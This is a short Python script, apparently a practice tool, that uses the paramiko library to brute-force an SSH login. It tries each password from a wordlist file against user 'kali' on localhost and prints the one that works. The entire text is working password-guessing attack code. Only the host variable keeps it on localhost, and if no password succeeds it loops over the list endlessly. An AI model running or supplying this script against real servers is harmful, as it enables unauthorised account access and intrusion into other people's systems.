import paramiko
import time


f = open("list.txt", "r")
content = f.readlines()

validate = False

host = "localhost"

port = 22

username = "kali"

ssh = paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())


while not validate:
    for i in content:
        try:
            print (i.strip())
            ssh.connect(host, port, username, i.strip())
            validate = True

            if validate:
                print ("password = "+ i.strip())
                break
        except:
            print ("not " + i.strip())
            time.sleep(10)


f.close()
